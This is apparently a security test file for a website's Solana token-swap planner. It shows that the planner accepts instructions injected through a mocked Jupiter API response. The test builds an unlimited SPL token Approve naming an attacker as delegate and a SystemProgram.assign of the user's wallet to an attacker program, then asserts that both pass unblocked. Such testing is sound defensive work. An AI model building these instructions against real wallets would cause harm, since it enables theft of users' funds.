import { describe, expect, it, vi, beforeAll } from 'vitest';
import * as web3 from '@solana/web3.js';

const TOKEN = 'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA';
const USDC = 'EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v';
const BONK = 'DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263';
const user = web3.Keypair.generate().publicKey.toBase58();
const attacker = web3.Keypair.generate().publicKey.toBase58();
const ata = (o: string, m: string) => web3.PublicKey.findProgramAddressSync([new web3.PublicKey(o).toBytes(), new web3.PublicKey(TOKEN).toBytes(), new web3.PublicKey(m).toBytes()], new web3.PublicKey('ATokenGPvbdGVxr1b2hvZbsiqW5xWbuhQS4mPpPzEAP'))[0].toBase58();
const tokAcc = (amount: bigint) => { const b = new Uint8Array(165); new DataView(b.buffer).setBigUint64(64, amount, true); b[108] = 1; return [Buffer.from(b).toString('base64'), 'base64']; };

vi.mock('../../../../../website/src/scripts/walletSend.ts', () => ({
  loadWeb3: async () => web3,
  fetchAccount: async (a: string) => (a === USDC || a === BONK ? { lamports: 1n, owner: TOKEN, executable: false, data: new Uint8Array(82) } : { lamports: 10n ** 9n, owner: '11111111111111111111111111111111', executable: false, data: new Uint8Array() }),
  rpcCall: async (method: string, params: any[]) => {
    if (method === 'getLatestBlockhash') return { value: { blockhash: web3.Keypair.generate().publicKey.toBase58() } };
    if (method === 'getMultipleAccounts') return { value: [{ lamports: 10_000_000_000, data: ['', 'base64'] }, null, { lamports: 2039280, data: tokAcc(5_000n) }, null] };
    if (method === 'simulateTransaction') return { value: { err: null, logs: [], accounts: [{ lamports: 10_000_000_000 - 1_000_000_000 - 2_100_000, data: ['', 'base64'] }, { lamports: 2039280, data: tokAcc(150_000_000n) }, { lamports: 2039280, data: tokAcc(5_000n) }, null] } };
    throw new Error('unexpected ' + method);
  },
}));

describe('Jupiter swap-instructions are not allow-listed: balance-neutral malicious instructions pass', () => {
  it('planSwap accepts an injected SPL Approve(delegate=attacker, u64::MAX) on another token and SystemProgram.assign of the wallet', async () => {
    const { planSwap, SOL_MINT } = await import('../../../../../website/src/scripts/walletSwap');
    const approveData = Buffer.alloc(9); approveData[0] = 4; approveData.writeBigUInt64LE(2n ** 64n - 1n, 1);
    const assign = web3.SystemProgram.assign({ accountPubkey: new web3.PublicKey(user), programId: new web3.PublicKey(attacker) });
    const j = (i: web3.TransactionInstruction) => ({ programId: i.programId.toBase58(), accounts: i.keys.map((k) => ({ pubkey: k.pubkey.toBase58(), isSigner: k.isSigner, isWritable: k.isWritable })), data: Buffer.from(i.data).toString('base64') });
    const evilApprove = new web3.TransactionInstruction({ programId: new web3.PublicKey(TOKEN), keys: [{ pubkey: new web3.PublicKey(ata(user, BONK)), isSigner: false, isWritable: true }, { pubkey: new web3.PublicKey(attacker), isSigner: false, isWritable: false }, { pubkey: new web3.PublicKey(user), isSigner: true, isWritable: false }], data: approveData });
    const swapIx = web3.SystemProgram.transfer({ fromPubkey: new web3.PublicKey(user), toPubkey: new web3.PublicKey(attacker), lamports: 1 });
    globalThis.fetch = (async () => new Response(JSON.stringify({ setupInstructions: [j(evilApprove)], swapInstruction: j(swapIx), otherInstructions: [j(assign)], addressLookupTableAddresses: [] }), { status: 200 })) as any;
    const quote = { raw: {} as any, inAmount: 1_000_000_000n, outAmount: 150_000_000n, minOut: 149_000_000n, slippageBps: 50, routes: [], fetchedAt: Date.now() };
    const plan = await planSwap({ user, from: { mint: SOL_MINT, symbol: 'SOL', name: '', decimals: 9, icon: null, verified: null }, to: { mint: USDC, symbol: 'USDC', name: '', decimals: 6, icon: null, verified: null }, amountRaw: 1_000_000_000n, slippageBps: 50, heldOthers: [{ mint: BONK, symbol: 'BONK' }], quote, feeBps: 0n });
    expect(plan.blockers).toEqual([]);
    const progs = plan.transaction.message.compiledInstructions.map((ix) => plan.transaction.message.staticAccountKeys[ix.programIdIndex]!.toBase58());
    expect(progs).toContain(TOKEN); // the Approve made it into the message
    const datas = plan.transaction.message.compiledInstructions.map((ix) => ix.data[0]);
    expect(datas).toContain(4); // SPL Approve
    expect(datas).toContain(1); // System Assign (u32 LE = 1)
  });
});
